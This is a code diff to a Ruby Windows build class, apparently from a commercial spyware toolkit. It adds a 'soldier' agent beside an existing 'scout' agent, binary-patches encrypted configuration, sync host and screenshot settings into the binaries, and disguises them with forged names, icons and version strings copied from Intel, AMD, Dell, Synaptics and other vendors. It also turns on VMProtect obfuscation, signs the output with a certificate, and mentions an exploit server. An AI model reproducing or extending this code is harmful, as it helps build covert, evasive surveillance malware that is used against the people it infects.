@@ -45,23 +45,43 @@ class BuildWindows < Build
     params[:config] = nil
     super
 
+    # patch the soldier
+    params[:core] = 'soldier'
+    params[:config] = nil
+    super
+
     marker = nil
+
+    trace :debug, "Patching soldier config"
+
+    patch_file(:file => 'soldier') do |content|
+      begin
+        marker = "Config"
+        # binary patch the config
+        config = @factory.configs.first.encrypted_soldier_config(@factory.confkey)
+        bin = [config.bytesize].pack('I') + config.ljust(512 - 4, "\x00")
+        # pad the config to 512 bytes
+        content.binary_patch 'CONF'*128, bin
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
+      end
+    end
 
     trace :debug, "Patching scout for sync and shot"
 
     patch_file(:file => 'scout') do |content|
       begin
-      host = @factory.configs.first.sync_host
-      raise "Sync host not found" unless host
-      marker = "Sync"
-      content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+        host = @factory.configs.first.sync_host
+        raise "Sync host not found" unless host
+        marker = "Sync"
+        content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
 
-      marker = "Screenshot"
-      # pay attention this flag is inverted. 0000 means screenshot is enabled, 1111 is disabled
-      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
+        marker = "Screenshot"
+        # pay attention this flag is inverted. 0000 means screenshot is enabled, 1111 is disabled
+        content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
 
-      marker = "Module name"
-      content.binary_patch 'MODUNAME', module_name('scout')
+        marker = "Module name"
+        content.binary_patch 'MODUNAME', module_name('scout')
       rescue Exception => e
         raise "#{marker} marker not found: #{e.message}"
       end
@@ -152,6 +172,7 @@ class BuildWindows < Build
     @bit64 = (params['bit64'] == false) ? false : true
     @codec = (params['codec'] == false) ? false : true
     @scout = (params['scout'] == false) ? false : true
+    @soldier = (params['soldier'] == true) ? true : false
     @melted = params['input'] ? true : false
 
     # choose the correct melting mode
@@ -160,15 +181,13 @@ class BuildWindows < Build
     melting_mode = :melted if @melted
 
     # change the icon of the exec accordingly to the name
-    customize_scout(@factory.confkey, params['icon']) if @scout
+    customize_scout_and_soldier(@factory.confkey) if @scout or @soldier
 
     trace :debug, "Build: melting mode: #{melting_mode}"
 
     case melting_mode
       when :silent
         silent()
-        # needed for the fake flash update
-        customize_icon(path('output'), params['icon']) if params['icon'] and not @scout
       when :cooked
         # this is a build for the NI
         cook()
@@ -223,6 +242,10 @@ class BuildWindows < Build
       core_content = z.file.open('scout', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
+
+      core_content = z.file.open('soldier', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('soldier'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
@@ -234,18 +257,26 @@ class BuildWindows < Build
 
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
     FileUtils.rm_rf Config.instance.temp('scout')
+
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('soldier')}"
+    FileUtils.rm_rf Config.instance.temp('soldier')
   end
 
   def scout_name(seed)
     scout_names = [
-    	{name: 'BTHSAmpPalService', version: '15.5.0.14', desc: 'Intel(r) Centrino(r) Wireless Bluetooth(r) + High Speed Virtual Adapter', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 2012'},
-    	{name: 'CyCpIo', version: '2.5.0.16', desc: 'Trackpad Bus Monitor', company: 'Cypress Semiconductor Corporation', copyright: 'Copyright (c) 2012 Cypress Semiconductor Corporation'},
-    	{name: 'CyHidWin', version: '2.5.0.16', desc: 'Trackpad Gesture Engine Monitor', company: 'Cypress Semiconductor Inc.', copyright: '(c) 2012 Cypress Semiconductor Inc. All rights reserved.'},
-    	{name: 'iSCTsysTray', version: '3.0.30.1526', desc: 'Intel(r) Smart Connect Technology System Tray Notify Icon', company: 'Intel Corporation', copyright: 'Copyright (c) 2011 Intel Corporation'},
-    	{name: 'quickset', version: '11.1.27.2', desc: 'QuickSet', company: 'Dell Inc.', copyright: '(c) 2010 Dell Inc.'}
+      {name: 'btplayerctrl', version: '1.1.0.52', desc: 'Intel PROSet\Wireless Bluetooth', company: 'Motorola Solutions, Inc.', copyright: '(c) 2012 Motorola Solutions, Inc.' },
+      {name: 'HydraDM', version: '4.0.66.0', desc: 'AMD HydraVision Desktop Manager', company: 'AMD', copyright: 'Copyright (c) AMD 2006-2010' },
+      {name: 'iFrmewrk', version: '14.1.1.1', desc: 'Intel(R) ProSet/Wireless Framework', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 1999-2011' },
+      {name: 'Toaster', version: '1.0.1.140', desc: 'Dell Backup And Recovery', company: 'SoftThinks SAS', copyright: '(c) 2007-2013 SoftThinks SAS' },
+      {name: 'rusb3mon', version: '3.0.8.0', desc: 'USB 3.0 Monitor', company: 'Renesas Electronics Corporation', copyright: '(c) 2010-2011 Renesas Electronics Corporation' },
+      {name: 'SynTPEnh', version: '15.3.5.0', desc: 'Synaptics TouchPad Enhancements', company: 'Synaptics Incorporated', copyright: 'Copyright (c) Synaptics Incorporated 1996-2011' }
     ]
 
     scout_names[seed.ord % scout_names.size]
+  end
+
+  def soldier_name(seed)
+    scout_name(seed[0].next)
   end
 
   private
@@ -290,6 +321,9 @@ class BuildWindows < Build
     if @scout
       # the scout is already created
       FileUtils.cp path('scout'), path('output')
+    elsif @soldier
+      # the scout is already created
+      FileUtils.cp path('soldier'), path('output')
     else
       # we have to create a silent installer
       cook()
@@ -308,15 +342,6 @@ class BuildWindows < Build
         end
       end
 
-=begin
-      content = File.open(path(silent_file), 'rb') {|f| f.read}
-      offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
-      raise "offset is nil" if offset.nil?
-      output = content.binary_patch_at_offset offset, cooked
-
-      File.open(path('output'), 'wb') {|f| f.write output}
-
-=end
       # delete the cooked output file and overwrite it with the silent output
       FileUtils.rm_rf path('output')
       FileUtils.cp path('silent'), path('output')
@@ -402,42 +427,57 @@ class BuildWindows < Build
     fake_names[seed.ord % fake_names.size] + ' ' + fakever
   end
 
-  def customize_scout(seed, icon)
+  def customize_scout_and_soldier(seed)
 
-    case icon
-      when 'flash'
-        icon_file = "icons/#{icon}.ico"
-        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
-      else
-        info = scout_name(seed)
-        icon_file = "icons/#{info[:name]}.ico"
+    info_scout = scout_name(seed)
+    icon_scout = "icons/#{info_scout[:name]}.ico"
+    info_soldier = soldier_name(seed)
+    icon_soldier = "icons/#{info_soldier[:name]}.ico"
+
+    # make the name unique (used by the exploit script on exploit server)
+    # only if a name is not provided ('agent' is the default)
+    if @appname.eql? 'agent'
+      hash = Digest::SHA1.digest(File.read(path('version')) + info_scout[:name])
+      hash = hash.split('').keep_if {|x| x.ord > 128}.join[0..5].unpack('H*').first
+      @appname += '_' + hash
     end
 
     # binary patch the name of the scout once copied in the startup
     patch_file(:file => 'scout') do |content|
       begin
         # the filename of the final exec
-        content.binary_patch 'SCOUT'*4, info[:name].ljust(20, "\x00")
+        content.binary_patch 'SCOUT'*4, info_scout[:name].ljust(20, "\x00")
       rescue
         raise "Scout name marker not found"
       end
     end
+    patch_file(:file => 'soldier') do |content|
+      begin
+        # the filename of the final exec
+        content.binary_patch 'SCOUT'*4, info_soldier[:name].ljust(20, "\x00")
+      rescue
+        raise "Soldier name marker not found"
+      end
+    end
 
     # change the icon
-    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_file)}"
+    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_scout)}"
+    CrossPlatform.exec path('rcedit'), "/I #{path('soldier')} #{path(icon_soldier)}"
 
     # change the infos
-    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info_scout[:version]}\" /s pb \"\" /s desc \"#{info_scout[:desc]}\" /s company \"#{info_scout[:company]}\" /s (c) \"#{info_scout[:copyright]}\" /s product \"#{info_scout[:desc]}\" /pv \"#{info_scout[:version]}\""
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('soldier')} \"#{info_soldier[:version]}\" /s pb \"\" /s desc \"#{info_soldier[:desc]}\" /s company \"#{info_soldier[:company]}\" /s (c) \"#{info_soldier[:copyright]}\" /s product \"#{info_soldier[:desc]}\" /pv \"#{info_soldier[:version]}\""
 
     # pack the scout
     #CrossPlatform.exec path('packer32'), "#{path('scout')}"
 
     # vmprotect the scout
-    #CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
-    #FileUtils.mv path('scout_vmp'), path('scout')
+    CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
+    FileUtils.mv path('scout_vmp'), path('scout')
 
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('soldier')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
